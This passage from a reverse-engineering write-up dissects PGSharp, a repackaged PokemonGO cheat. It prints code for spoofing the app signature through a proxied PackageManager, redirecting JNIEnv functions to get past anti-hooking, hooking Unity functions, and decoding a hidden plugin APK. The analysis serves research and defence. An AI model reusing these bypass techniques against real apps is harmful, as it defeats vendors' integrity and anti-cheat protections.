jSONObject.put(r3.a(\u0026#34;FBA1\u0026#34;), LayoutInflater$Factory2o.i.e(context)); jSONObject.put(r3.a(\u0026#34;Gx4j\u0026#34;), Build.MODEL); String str = Build.VERSION.RELEASE; } } The string encoding routine being easy to reverse, we can create a Jadx plugin that automatically decodes these strings:\n[...] passes.add(new SimplifyVisitor()); passes.add(new PGSharpString()); // Automatically decode the strings passes.add(new CheckRegions()); [...] It results in this kind of output:\npublic void q() { String a = GL.a(\u0026#34;bug_url\u0026#34;, (String) null); if (a != null) { JSONObject jSONObject = new JSONObject(); Context context = GL.c; jSONObject.put(\u0026#34;type\u0026#34;, \u0026#34;ui\u0026#34;); jSONObject.put(\u0026#34;uid\u0026#34;, UI.g(context)); jSONObject.put(\u0026#34;state\u0026#34;, this.s); jSONObject.put(\u0026#34;spoofing\u0026#34;, ((Boolean) PL.a(\u0026#34;hlspoofing\u0026#34;)).booleanValue()); jSONObject.put(\u0026#34;rtl\u0026#34;, UI.f()); jSONObject.put(\u0026#34;lng\u0026#34;, Locale.getDefault().getDisplayLanguage()); jSONObject.put(\u0026#34;abi\u0026#34;, UI.a()); jSONObject.put(\u0026#34;bar\u0026#34;, LayoutInflater$Factory2o.i.e(context)); jSONObject.put(\u0026#34;mod\u0026#34;, Build.MODEL); String str = Build.VERSION.RELEASE; } } You can find the whole Jadx plugin on Github: PGSharpStrings.java\nCheat Mechanisms One disruptive feature of PGSharp is that it does not require a rooted device. Until recently, most of the PokemonGO cheating apps required a jailbroken or a rooted device which raises a barrier for people who are not familiar with rooting.\nBut wait, how hell they do that?\nThe structure of the PGSharp APK is very close to the genuine PokemonGO application, which leads identifying which parts of the game have been tampered with.\nA naive comparison (cf. zip_diff.py) raises mismatches on the following files:\nFile Size in PGSharp Size in PGO Delta classes.dex 9057844 8953000 +1.17% classes2.dex 7131864 7107296 +0.34% lib/arm64-v8a/libmain.so 21278480 6424 +331134% META-INF/MANIFEST.MF 351045 355533 -1.26% The high level of similarity between the two applications, associated with a different signature confirms that PGSharp repackaged the original application.\nDEX Files Comparison To figure out which parts of the DEX files have been modified, we can use LIEF (yes, LIEF can read the DEX format). Basically, the idea is to check which method(s) has a bytecode whose size is different from the real PokemonGO application:\nimport zipfile import lief with zipfile.ZipFile(CHEAT_FILE) as zip_file: with zip_file.open(target) as f: hela_dex = f.read() with zipfile.ZipFile(ORIG_FILE) as zip_file: with zip_file.open(target) as f: pgo_dex = f.read() hela_dex = lief.DEX.parse(list(hela_dex)) pgo_dex = lief.DEX.parse(list(pgo_dex)) hela = {f\u0026#34;{m.cls.pretty_name}.{m.name}.{m.prototype!s}\u0026#34;: len(m.bytecode) \\ for m in hela_dex.methods} pgo = {f\u0026#34;{m.cls.pretty_name}.{m.name}.{m.prototype!s}\u0026#34;: len(m.bytecode) \\ for m in pgo_dex.methods} for k, size_hela in hela.items(): size_pgo = pgo[k] if size_pgo != size_hela: print(f\u0026#34;Mismatch: {k}\u0026#34;) By running this script on classes.dex, we don\u0026rsquo;t find any difference. Actually, the PGSharp authors tried to prevent diffing by changing the line number attribute of the DEX classes. If we try to diff the two applications from the output of apktool or Jadx, we get a lot of noise as the line number is used in the output. On the other hand, the size bytecode for this kind of repackaging is suitable3.\nRunning the same script on classes2.dex raises the following mismatches:\nholoholo.libholoholo.unity.UnityMainActivity.onActivityResult holoholo.nativelib.Library.\u0026lt;clinit\u0026gt; In UnityMainActivity.onActivityResult, they changed this piece of code:\npublic void onActivityResult(int i, int i2, Intent intent) { UnityCallbackInfo unityCallbackInfo = this.activityCallbacks.get(Integer.valueOf(i)); if (unityCallbackInfo != null) { UnityPlayer.UnitySendMessage(unityCallbackInfo.mGameObjectName, unityCallbackInfo.mMethodName, String.valueOf(i2)); } else { Client.handleActivityResult(i, intent); } } into:\npublic void onActivityResult(int i, int i2, Intent intent) { UnityCallbackInfo unityCallbackInfo = this.activityCallbacks.get(Integer.valueOf(i)); if (unityCallbackInfo != null) { String mGameObjectName = unityCallbackInfo.mGameObjectName; UnityPlayer.UnitySendMessage(mGameObjectName, unityCallbackInfo.mMethodName, \u0026#34;HL.PL\u0026#34;.equals(mGameObjectName) ? intent == null ? \u0026#34;\u0026#34; : intent.getData().toString() : String.valueOf(i2)); return; } Client.handleActivityResult(i, intent); } While in the static constructor of the Library class, they force the loading of libmain.so:\nstatic { System.loadLibrary(\u0026#34;main\u0026#34;); System.loadLibrary(\u0026#34;holoholo\u0026#34;); } Now, let\u0026rsquo;s look at libmain.so\nlibmain.so Compared to the original PokemonGO APK, libmain.so in PGSharp is substantially larger. Moreover, the ELF metadata leaks the original file name of the file:\n$ readelf -d libmain.so ... 0x000000000000000e (SONAME) Library soname: [libhela.so] ... During the analysis of PGSharp, we find references to Hela in different places, like the package name of the dynamically-loaded APK: me.underworld.helaplugin.\nOriginally, the purpose of this library is to initialize some parts of the Unity engine but PGSharp uses it to load its main payload.\nIn the cheating app, libmain.so is responsible for:\nInitializing the Lua VM Implementing Lua native C functions Implementing JNI functions Calling the Lua scripts libmain.so exposes JNI_OnLoad which is used as an entrypoint to perform the actions listed above.\nThe JNI functions don\u0026rsquo;t have a meaningful name but thanks to their callsites, we can figure out their purpose:\nName Description Rename NRL Trigger Lua function from Java NativeRunLua NSMTC Trigger PGSharp Action - NOHRB OkHtttp callback NativeOkHttpResponseByte NOHR OkHtttp callback NativeOkHttpResponse NOHF OkHtttp callback NativeOkHttpFailure NIOS Google Signing? - NIOR Seems not used - NOT Perform periodic actions on Lua threads NativeOnTimer NIPE Related to PokemonGO Plus - NIOF Seems to do nothing relevant - Similarly, for the Lua C closures, we get the following table:\nName Description Rename callpgo Trigger Lua function from Java - add_unity_task Trigger PGSharp Action - initil2cppbase OkHtttp callback - initil2cpphooks OkHtttp callback - initil2cppmethods OkHtttp callback - newjbytearray Create a Java bytearray from Lua - nar - nativeAttestResponse ngak - nativeGetApiKey findclass Find a Java class from Lua - gettid Get Thread ID - logi Log info (empty) - logv Log verbose (empty) - init_plugin_natives Init Java layer (JNI + nUSlwbRIjReLowOP) - uf_whitelist empty - uf_forbid empty - uf_redirect empty - fkinitjni Lua wrapper4 FakeInitJNI fknalp Lua wrapper4 FakeNativeAddLocationProvider fkngsu Lua wrapper4 FakeNativeGpsStatusUpdate fknlu Lua wrapper4 FakeNativeLocationUpdate getPoisFromCache Related to the autowalk feature - \u0026nbsp;\u0026nbsp;NRL Actions Action Event Task 1 plg.float.click 2 plg.float.remove 3 plg.map.tp 4 plg.setspeed 5 plg.randomwalk 6 plg.enablespoof 7 plg.joystart 8 plg.joystop 9 plg.entergame 10 plg.pause Long story short, PGSharp repackages the PokemonGO application and implements its payload in libmain.so But wait, since they repackage the application they have to re-sign the application and you won\u0026rsquo;t tell me that PokemonGO does have signature checks?\nAnd this is where the fun begins!\nThe functionalities of PGSharp heavily rely on hooking but not the hooking you might think of \u0026hellip;\nSignature Bypass As it is detailed in the next section, libmain.so dynamically loads another APK. Within this APK, and more precisely in the class androidx.appcompat.app.AppCompatDelegateImpl5, we can notice this method:\n/* renamed from: g */ public static void proxifySignatureCheck(Context context) { String packageName = context.getPackageName(); Class\u0026lt;?\u0026gt; aThreadCls = Class.forName(\u0026#34;android.app.ActivityThread\u0026#34;); Object mCurrentActivityThread = aThreadCls.getDeclaredMethod(\u0026#34;currentActivityThread\u0026#34;, new Class[0]).invoke(null, new Object[0]); Field sPackageManager = aThreadCls.getDeclaredField(\u0026#34;sPackageManager\u0026#34;); sPackageManager.setAccessible(true); Object pm = sPackageManager.get(mCurrentActivityThread); Class\u0026lt;?\u0026gt; IPackageManager = Class.forName(\u0026#34;android.content.pm.IPackageManager\u0026#34;); SignatureMock mock = new SignatureMock(pm, \u0026#34;30820 [ ... ] aa001f55\u0026#34;, packageName) Object newProxyInstance = Proxy.newProxyInstance(IPackageManager.getClassLoader(), new Class[]{IPackageManager}, mock); sPackageManager.set(mCurrentActivityThread, newProxyInstance); PackageManager packageManager = context.getPackageManager(); Field mPM = packageManager.getClass().getDeclaredField(\u0026#34;mPM\u0026#34;); mPM.setAccessible(true); mPM.set(packageManager, newProxyInstance); } This code leverages the Java hooking API, java.lang.reflect.Proxy, to proxify the Android PackageManager ¯\\_(ツ)_/¯.\nThe mocked PackageManager looks like this:\npublic SignatureMock(Object pm, String originalSignature, String packageName) { this.mPackageManager = pm; this.mOriginalSignature = originalSignature; this.mPackageName = packageName; } @Override // java.lang.reflect.InvocationHandler public Object invoke(Object obj, Method inMeth, Object[] args) { PackageInfo packageInfo; SigningInfo signingInfo; // Hook getPackageInfo if (\u0026#34;getPackageInfo\u0026#34;.equals(inMeth.getName())) { String pkgName = (String) args[0]; int flags = ((Integer) args[1]).intValue(); // Handle both // GET_SIGNATURES (0x00000040) - Deprecated in API 28 // GET_SIGNING_CERTIFICATES (0x08000000) if ((flags \u0026amp; PackageManager.GET_SIGNATURES) != 0 \u0026amp;\u0026amp; this.mPackageName.equals(pkgName)) { PackageInfo fakePkgInfo = (PackageInfo) inMeth.invoke(this.mPackageManager, args); // Fake the signature fakePkgInfo.signatures[0] = new Signature(this.mOriginalSignature); return fakePkgInfo; } else if (Build.VERSION.SDK_INT \u0026gt;= 28 \u0026amp;\u0026amp; (flags \u0026amp; GET_SIGNING_CERTIFICATES) != 0 \u0026amp;\u0026amp; this.mPackageName.equals(pkgName) \u0026amp;\u0026amp; (signingInfo = (packageInfo = (PackageInfo) method.invoke(this.mPackageManager, args)).signingInfo) != null) { Field FieldSigningDetails = signingInfo.getClass().getDeclaredField(\u0026#34;mSigningDetails\u0026#34;); FieldSigningDetails.setAccessible(true); Object mSigningDetails = FieldSigningD.get(packageInfo); Signature[] fakeSigArray = {new Signature(this.mOriginalSignature)}; Field FieldSignatures = mSigningDetails.getClass().getDeclaredField(\u0026#34;signatures\u0026#34;); FieldSignatures.setAccessible(true); FieldSignatures.set(FieldSigningDetails, fakeSigArray); return packageInfo; } } return inMeth.invoke(this.mPackageManager, args); } In doing so, when PokemonGO accesses the PackageManager, it gets a mocked version of the PackageManager that is controlled by PGSharp. PGSharp changes the behavior of getPackageInfo() to return the real PokemonGO signature instead of its own.\nThe following figure outlines the process:\nDynamic APK Loading In the Lua script plugin.lua, PGSharp defines an init function that performs the following actions:\nlocal filesdir = (ref.call_method)(runtime.app, \u0026#34;getFilesDir\u0026#34;, \u0026#34;()Ljava/io/File;\u0026#34;) local filesdirpath = (ref.call_method)(filesdir, \u0026#34;getAbsolutePath\u0026#34;, \u0026#34;()Ljava/lang/String;\u0026#34;) u_plugin_path = (gh.ipf)(loadjstring(filesdirpath)) ipf is a function that takes the output of cxt.getFilesDir().getAbsolutePath() as parameter, in other words, the path of the files directory of PokemonGO: /data/data/com.nianticlabs.pokemongo/files, and returns a u_plugin_path as a Lua string.\nIf we look for ipf in the Lua scripts, we don\u0026rsquo;t find any implementation. Actually, this function is referenced in the gamehelper() function of libmain.so where it is linked as follows:\nSo ipf is a native Lua C function registered with lua_pushcclosure.\nOnce we identified the location of ipf, the logic of the function can be summarized with this pseudo code:\n// file_dir: /data/user/0/com.nianticlabs.pokemongo/files void ipf(lua_State *L) { // std::string ctor @0xA4F00 std::string outpath = lua_tostring(L, -1); // std::string::append @0xD868C outpath.append(\u0026#34;/\u0026#34;); outpath.append(\u0026#34;LZZqoKpt.plg\u0026#34;); FILE* fout = fopen(outpath.c_str(), \u0026#34;wb\u0026#34;); // @0x634424 extract_apk_file(FILE* fout) { for (chunk : chunks) { decode(chunk, 0x2710); fwrite(chunk, 0x2710, 1, fout); } } fclose(fout); lua_pushlstring(L, outpath.c_str(), outpath.size()); } void inline_decode(uint8_t* data, size_t size) { for (size_t i = 0; i \u0026lt; size; ++i) { // Byte decoding data[i] = (0xb3 \u0026amp; ~data[i]) | (data[i] \u0026amp; 0x4c) } } Since the decoded file is written in the /data partition, one can also pull the file from the device (this file is not removed when PGSharp stops running). The written file, LZZqoKpt.plg, is actually an APK that is loaded with PathClassLoader in the Lua script:\nu_classloader = (ref.new_instance)(\u0026#34;dalvik/system/PathClassLoader\u0026#34;, \u0026#34;(Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V\u0026#34;, (env.NewStringUTF)(u_plugin_path), nativeLibraryDir, gh.pgo_classloader); \u0026nbsp;\u0026nbsp;Rest of the function u_plugin_cls = findclass(\u0026#34;me/underworld/helaplugin/PL\u0026#34;, u_classloader) u_global_cls = findclass(\u0026#34;me/underworld/helaplugin/GL\u0026#34;, u_classloader) u_runnable_cls = findclass(\u0026#34;me/underworld/helaplugin/HR\u0026#34;, u_classloader) u_global_cls = (env.NewGlobalRef)(u_global_cls) u_plugin_cls = (env.NewGlobalRef)(u_plugin_cls) u_classloader = (env.NewGlobalRef)(u_classloader) u_runnable_cls = (env.NewGlobalRef)(u_runnable_cls) u_runnable_init_mid = (env.GetMethodID)(u_runnable_cls, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, \u0026#34;(ILjava/lang/Object;)V\u0026#34;) u_geturl_mid = (env.GetStaticMethodID)(u_plugin_cls, \u0026#34;GU\u0026#34;, \u0026#34;(Ljava/lang/String;Ljava/lang/String;)I\u0026#34;) u_postString_mid = (env.GetStaticMethodID)(u_plugin_cls, \u0026#34;vtEdUZmWQYAgtGWs\u0026#34;, \u0026#34;(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I\u0026#34;) u_postBytes_mid = (env.GetStaticMethodID)(u_plugin_cls, \u0026#34;BbTwaTXurePBxTDt\u0026#34;, \u0026#34;(Ljava/lang/String;[BLjava/lang/String;)I\u0026#34;) u_onLuaMessage_mid = (env.GetStaticMethodID)(u_plugin_cls, \u0026#34;tFAxNZCNHOXBTYGM\u0026#34;, \u0026#34;(ILjava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;\u0026#34;) u_global_updatelocation_mid = (env.GetStaticMethodID)(u_global_cls, \u0026#34;ul\u0026#34;, \u0026#34;(DD)V\u0026#34;) u_global_savelocation_mid = (env.GetStaticMethodID)(u_global_cls, \u0026#34;sl\u0026#34;, \u0026#34;()V\u0026#34;) (gh.init_plugin_natives)(u_classloader) (ref.call_static_method)(u_plugin_cls, \u0026#34;rDymrMuxPIlIESFe\u0026#34;, \u0026#34;(Landroid/app/Application;Ljava/lang/String;I)V\u0026#34;, runtime.app, (env.NewStringUTF)(u_plugin_path), runtime.log_level) local cls = (gh.findclass)(\u0026#34;me.underworld.helaplugin.HLVM\u0026#34;, u_classloader) local hlviewmanagerref = (ref.call_static_method)(cls, \u0026#34;getInstance\u0026#34;, \u0026#34;()Lme/underworld/helaplugin/HLVM;\u0026#34;) u_sm_mid = (env.GetMethodID)(cls, \u0026#34;SM\u0026#34;, \u0026#34;(Ljava/lang/String;I)V\u0026#34;) u_setviewshow_mid = (env.GetMethodID)(cls, \u0026#34;SVC\u0026#34;, \u0026#34;(Ljava/lang/String;Z)V\u0026#34;) u_hlviewmanager = (env.NewGlobalRef)(hlviewmanagerref) plugin.classloader = u_classloader GPS Spoofing Since PokemonGO heavily relies on the user\u0026rsquo;s location, the must-have feature for the PokemonGO cheat engines is to be able to spoof the GPS location.\nThe genuine PokemonGO application manages the user location through the Java class NianticLocationManager, which exposes three natives functions:\nnativeAddLocationProviders(Context ctx) nativeGpsStatusUpdate(int i, SatelliteInfo[] info) nativeLocationUpdate(String providerName, Location location, \u0026hellip;) nativeAddLocationProviders aims at instantiating the different location providers as Java object:\nFusedLocationProvider GnssLocationProvider GpsLocationProvider NetworkLocationProvider while nativeLocationUpdate and nativeGpsStatusUpdate are a kind of callbacks triggered when there is a new user location to consider.\nThe implementation of nativeLocationUpdate checks natively if the location object given in the second parameter is mocked (cf. isMock() or isFromMockProvider()).\nActually PGSharp hooks two of these three native methods:\nnativeAddLocationProviders(Context ctx) nativeGpsStatusUpdate(int i, SatelliteInfo[] info) nativeLocationUpdate(String provider, Location location, \u0026hellip;) By hooking nativeLocationUpdate, they can modify the value of the Location parameter to change the real location.\n\u0026ldquo;You assert that PGSharp hooks nativeLocationUpdate and nativeAddLocationProviders in libNianticLabsPlugin.so, but this library is protected by a commercial obfuscator which has anti-hooks features. How do they hook these functions?\u0026rdquo;\nAnd this is where the fun reaches another level 🚀\nJNIEnv Proxifier I would assume that nativeLocationUpdate and nativeAddLocationProviders are critical enough to be protected against hooking. It turns out that PGSharp embeds a hooking framework to hook Unity functions, but they don\u0026rsquo;t use it on these functions.\nThe authors of PGSharp found a subtle trick to circumvent the anti-hook protection.\nnativeLocationUpdate and nativeAddLocationProviders are JNI functions that are dynamically registered by Java_com_nianticlabs_nia_unity_UnityUtil_nativeInit:\nJava_com_nianticlabs_nia_unity_UnityUtil_nativeInit(env, ...) { env-\u0026gt;RegisterNatives(...); } The env parameter refers to the JNIEnv structure which is an array of function pointers:\nstruct JNINativeInterface { ... jclass (*GetObjectClass)(JNIEnv*, jobject); jboolean (*IsInstanceOf)(JNIEnv*, jobject, jclass); jmethodID (*GetMethodID)(JNIEnv*, jclass, const char*, const char*); ... } The values of these pointers are defined by the implementation of the \u0026ldquo;JVM\u0026rdquo; which is, for Android, the Android RunTime (ART).\nFor instance, FindClass is actually a pointer to art::{CheckJNI, JNIImpl}::FindClass located in art/runtime/jni/{jni_internal, check_jni}.cc:\nstatic jclass FindClass(JNIEnv* env, const char* name) { Runtime* runtime = Runtime::Current(); ClassLinker* class_linker = runtime-\u0026gt;GetClassLinker(); std::string descriptor(NormalizeJniClassDescriptor(name)); ScopedObjectAccess soa(env); ObjPtr\u0026lt;mirror::Class\u0026gt; c = nullptr; if (runtime-\u0026gt;IsStarted()) { StackHandleScope\u0026lt;1\u0026gt; hs(soa.Self()); Handle\u0026lt;mirror::ClassLoader\u0026gt; class_loader(hs.NewHandle(GetClassLoader\u0026lt;kEnableIndexIds\u0026gt;(soa))); c = class_linker-\u0026gt;FindClass(soa.Self(), descriptor.c_str(), class_loader); } else { c = class_linker-\u0026gt;FindSystemClass(soa.Self(), descriptor.c_str()); } return soa.AddLocalReference\u0026lt;jclass\u0026gt;(c); } If we hook Java_com_nianticlabs_nia_unity_UnityUtil_nativeInit from the genuine PokemonGO, and we check where the pointers of the JNIEnv structure point to, we get this kind of output:\nThis output is consistent with what we said about the JVM and the runtime ART. If we do the same check on PGSharp, we get this result:\nAs we can see, some pointers have been relocated to point in libmain.so:\nJNI Function Offset in libmain.so (v1.33.0) GetMethodID 0x14540c CallObjectMethodV 0x145194 CallVoidMethodV 0x145040 RegisterNatives 0x1452f0 It means that when libNianticLabsPlugin.so is calling one of the functions listed above, the execution is forwarded to libmain.so instead of libart.so.\nPGSharp proxifies these functions for the following purposes:\nGetMethodID\nTo monitor:\nSafetyNetService.attest SafetyNetService.cancel NianticLocationManager.addLocationProvider CallVoidMethodV\nTo monitor the parameters of:\nSafetyNetService.attest (to intercept the nonce) SafetyNetService.cancel RegisterNatives\nProxified to get, and potentially change, the effective location of the libNianticLabsPlugin.so JNI functions:\nnativeAttestResponse nativeGetApiKey nativeAddLocationProviders nativeLocationUpdate initJni nativeInjectEvent nativeUnitySendMessage nativeRender nativeMuteMasterAudio By managing the function JNIEnv::RegisterNatives, they are able to change the value of JNINativeMethod.fnPtr, such as when PokemonGO calls nativeLocationUpdate, it actually calls a function managed by PGSharp.\nIt results that JNI functions used by libNianticLabsPlugin.so have been redefined:\nJNI Function Location NianticLocationManager.nativeAddLocationProviders libmain.so!ea868 NianticLocationManager.nativeGpsStatusUpdate libNianticLabsPlugin.so!bc508 NianticLocationManager.nativeLocationUpdate libmain.so!ea8bc NLog.nativeDispatchLogMessage libNianticLabsPlugin.so!4beaa0 NetworkConnectivity.nativeNotifyNetworkStateChanged libNianticLabsPlugin.so!6f8118 NianticTrustManager.nativeCheckClientTrusted libNianticLabsPlugin.so!9b9cc NianticTrustManager.nativeCheckServerTrusted libNianticLabsPlugin.so!73b42c NianticTrustManager.nativeGetAcceptedIssuers libNianticLabsPlugin.so!6dc5c8 WebsocketController.nativeOnDidClose libNianticLabsPlugin.so!6fcabc WebsocketController.nativeOnDidFail libNianticLabsPlugin.so!4a0d0c WebsocketController.nativeOnDidOpen libNianticLabsPlugin.so!5922b0 WebsocketController.nativeOnDidReceiveData libNianticLabsPlugin.so!742fa8 SafetyNetService.nativeAttestResponse libNianticLabsPlugin.so!5ea1b8 SafetyNetService.nativeGetApiKey libNianticLabsPlugin.so!6bc60 NianticSensorManager.nativeCompassUpdate libNianticLabsPlugin.so!4b9bc0 NianticSensorManager.nativeSensorUpdate libNianticLabsPlugin.so!177c44 Unity Hooks In addition to GPS spoofing, PGSharp provides other functionalities such as, Pokemon feed, skip evolve animation \u0026hellip;\nIn the genuine PokemonGO application, these functionalities are implemented in the Unity layer that is compiled into libil2cpp.so.\nTo perform these functionalities, PGSharp hooks (hooking like Frida) some of these Unity functions.\nThey tried to hide6 the underlying hooking framework used to perform these hooks, unfortunately they missed to remove important strings:\n$ strings ./libmain.so|grep -i -E \u0026#34;\\w\\+\\.cc\u0026#34; E:/work/code/Hela/app/src/main/cpp/Dobby/source/InterceptRouting/Routing/FunctionInlineReplace/FunctionInlineReplaceExport.cc E:/work/code/Hela/app/src/main/cpp/Dobby/source/TrampolineBridge/Trampoline/arm64/trampoline-arm64.cc E:/work/code/Hela/app/src/main/cpp/Dobby/source/MemoryAllocator/MemoryArena.cc E:/work/code/Hela/app/src/main/cpp/Dobby/source/InstructionRelocation/arm64/ARM64InstructionRelocation.cc E:/work/code/Hela/app/src/main/cpp/Dobby/source/UserMode/PlatformUtil/Linux/ProcessRuntimeUtility.cc E:/work/code/Hela/app/src/main/cpp/Dobby/source/UserMode/UnifiedInterface/platform-posix.cc So the hooking framework is Dobby:\n\u0026nbsp;\u0026nbsp;\u0026nbsp;https://github.com/jmpews/Dobby Unity hooks start, in the script init.lua of PGSharp where they wait for the loading of libil2cpp.so7:\nset_event_handler(\u0026#34;pgo.il2ready\u0026#34;, function(il2base) runtime.il2base = il2base; (gh.initil2cppmethods)(); (gh.initil2cpphooks)(); end ) initil2cppmethods() aims at resolving the address of PokemonGO Unity functions needed to perform cheating actions, while initil2cpphooks() dobby-hooks some Unity functions to change their behaviour. In the version 1.33 of PGSharp, they hook 207 functions of libil2cpp.so and we will take one of them to detail the internal mechanisms:\nUnityEngine.Application$$OpenURL First of all, if we look at the symbols or the strings of libil2cpp.so, we don\u0026rsquo;t find meaningful information that could help to figure out the original purpose of the Unity functions. In fact, the Unity metadata are embedded in global-metadata.dat, and to recover the bindings between this file and libil2cpp.so, we can use Perfare/Il2CppDumper.\nThey compute the absolute of a Unity function by adding the offset provided by global-metadata.dat to the base address of libil2cpp.so. Here is an example UnityEngine.Application$$OpenURL:\nMOV W13, 0x4bfeea0 ; Offset of the function (thanks to global-metadata.dat) ADRP X14, #Application_OpenURL ADD X13, X8, X13 ; Add the libil2cpp.so base address STR X13, [X14, #Application_OpenURL] ; Store the absolute address in libmain.so The function associated with initil2cpphooks() is quite large as shown in the figure below:\nActually, the function is large but easily understandable statically8. The right-hand side of the figure is actually the catch { ... } handlers of the exceptions, while the left-hand side that goes down, initializes C++ objects. In this area of the CFG, we find the same pattern that repeats all the way down:\nFrom what we can see, it initializes a C++ object (on the stack) and the first instructions setup the VTable. We can find the relevant function in the last entry of the VTable that contains the hooking logic:\nFrom this code, we can see that they perform the resolution of the absolute address of UnityEngine.Application$$OpenURL. Also, thanks to the prototype of DobbyHook() we can quickly understand that the new behavior of OpenURL is located in the function sub_6C983C:\nIn this hook, they check if PokemonGO is opening its Google Play URL and redirect the user to the PGSharp home page.\nNetwork Communications and Encryption The cheating application communicates with its servers through the TLS/HTTP protocol and adds another layer of encryption on the top of TLS. To encrypt the HTTP payload, they use AES in the CBC mode. We can identify the AES algorithm thanks to clear S-BOX present in the .rodata section.\nIt seems that they use different keys, depending on the endpoint the application targets but we can retrieve them by hooking the AES key schedule function. It results that we can decrypt the communication between the application and the PGSharp servers9.\nHere are examples of endpoints and the data sent by PGSharp:\n\u0026nbsp;\u0026nbsp;hazelnuts POST hazelnuts Action: Handshake Request: { \u0026#34;bid\u0026#34;: \u0026#34;com.nianticlabs.pokemongo\u0026#34;, \u0026#34;clt\u0026#34;: \u0026#34;pgs\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;Samsung A40\u0026#34;, \u0026#34;lv\u0026#34;: -1, \u0026#34;nonce\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nonce_key\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;pgver\u0026#34;: \u0026#34;0.221.0\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;00000000-00000000-[...]\u0026#34;, \u0026#34;ver\u0026#34;: \u0026#34;1.33.0\u0026#34; } Response: { \u0026#34;err\u0026#34;: 0, \u0026#34;shiny\u0026#34;: [\u0026#34;List of shiny\u0026#34;], \u0026#34;hotplaces\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;🇧🇷 Consolacao, São Paulo, Brazil\u0026#34;, \u0026#34;lat\u0026#34;: -23.5512, \u0026#34;lng\u0026#34;: -46.6584 }, ] } \u0026nbsp;\u0026nbsp;Cw8dfkXpW7mq2i POST Cw8dfkXpW7mq2i Action: PGS_ACTIONS.GETPLAYER Request: { \u0026#34;bid\u0026#34;: \u0026#34;com.nianticlabs.pokemongo\u0026#34;, \u0026#34;clt\u0026#34;: \u0026#34;pgs\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;Samsung A40\u0026#34;, \u0026#34;lv\u0026#34;: 4, \u0026#34;nonce\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nonce_key\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;pgver\u0026#34;: \u0026#34;0.221.0\u0026#34;, \u0026#34;player\u0026#34;: { \u0026#34;ban\u0026#34;: 0, \u0026#34;captured\u0026#34;: 3, \u0026#34;encountered\u0026#34;: 5, \u0026#34;kmwalked\u0026#34;: 10.50, \u0026#34;outage\u0026#34;: 0, \u0026#34;pid\u0026#34;: \u0026#34;[redacted]\u0026#34;, \u0026#34;serverlo\u0026#34;: 0, \u0026#34;susp\u0026#34;: 0, \u0026#34;suspa\u0026#34;: 0, \u0026#34;visits\u0026#34;: 1, \u0026#34;warn\u0026#34;: 0, \u0026#34;warna\u0026#34;: 0, \u0026#34;warndt\u0026#34;: 623234511000000000, \u0026#34;warntm\u0026#34;: 0 }, \u0026#34;uid\u0026#34;: \u0026#34;00000000-00000000-[...]\u0026#34;, \u0026#34;ver\u0026#34;: \u0026#34;1.33.0\u0026#34; } \u0026nbsp;\u0026nbsp;SSZgBPn6Ixq2ZK POST SSZgBPn6Ixq2ZK Action: PGS_ACTIONS.GETREPORTABLE Request: { \u0026#34;bid\u0026#34;: \u0026#34;com.nianticlabs.pokemongo\u0026#34;, \u0026#34;clt\u0026#34;: \u0026#34;pgs\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;Samsung A40\u0026#34;, \u0026#34;lv\u0026#34;: 4, \u0026#34;nonce\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nonce_key\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;pgver\u0026#34;: \u0026#34;0.221.0\u0026#34;, \u0026#34;raid\u0026#34;: [ { \u0026#34;battle\u0026#34;: 1634490000000, \u0026#34;campaignId\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;complete\u0026#34;: false, \u0026#34;costume\u0026#34;: 12233, \u0026#34;dex\u0026#34;: 326, \u0026#34;eligible\u0026#34;: false, \u0026#34;end\u0026#34;: 1634490000000, \u0026#34;exclusive\u0026#34;: false, \u0026#34;form\u0026#34;: 0, \u0026#34;free\u0026#34;: false, \u0026#34;gender\u0026#34;: 1, \u0026#34;hidden\u0026#34;: false, \u0026#34;lat\u0026#34;: 0.1234, \u0026#34;lng\u0026#34;: 5.6789, \u0026#34;lv\u0026#34;: 3, \u0026#34;mov1\u0026#34;: 163, \u0026#34;mov2\u0026#34;: 90, \u0026#34;schedule\u0026#34;: false, \u0026#34;seed\u0026#34;: 5000000, \u0026#34;spawn\u0026#34;: 1634400000000, \u0026#34;team\u0026#34;: 1, \u0026#34;web\u0026#34;: 0, \u0026#34;wec\u0026#34;: 3 }, ], \u0026#34;uid\u0026#34;: \u0026#34;00000000-00000000-[...]\u0026#34;, \u0026#34;ver\u0026#34;: \u0026#34;1.33.0\u0026#34; } \u0026nbsp;\u0026nbsp;/pga/keycode/v-q2mgqcyji/ POST /pga/keycode/v-q2mgqcyji/ Action: Activate PGSharp with a premium key Request: { \u0026#34;ver\u0026#34;: \u0026#34;1.33.0\u0026#34;, \u0026#34;gi\u0026#34;: 1, \u0026#34;key\u0026#34;: \u0026#34;AVerySecretKey\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;Samsung A40\u0026#34;, \u0026#34;clt\u0026#34;: \u0026#34;pgs\u0026#34;, \u0026#34;ua\u0026#34;: \u0026#34;Samsung A40/11/[redacted]/arm64-v8a/[redacted]/unknow/unknown/English\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;00000000-00000000-[...]\u0026#34; } SafetyNet I skimmed this layer this weekend, so some parts might be inaccurate or wrong. In addition to standard code obfuscation, PokemonGO uses SafetyNet as an attestation mechanism. Similarly to the GPS management, we find a (non-obfuscated) Java layer implemented in the class SafetyNetService. This class exposes two native functions:\nString nativeGetApiKey() void nativeAttestResponse(byte[] nonce, String jwtResult) The implementation of these two functions is obfuscated within libNianticLabsPlugin.so.\nThe first function is used to get the Google SafetyNet API key (AIzaSyCh8l[...]_eOTXhM4) while the second one, is involved in the validation of the SafetyNet attestation.\nThanks to the JNIEnv proxy on GetMethodID and CallVoidMethodV, PGSharp is able to monitor the calls to SafetyNetService.attest(bytes[] nonce). When this 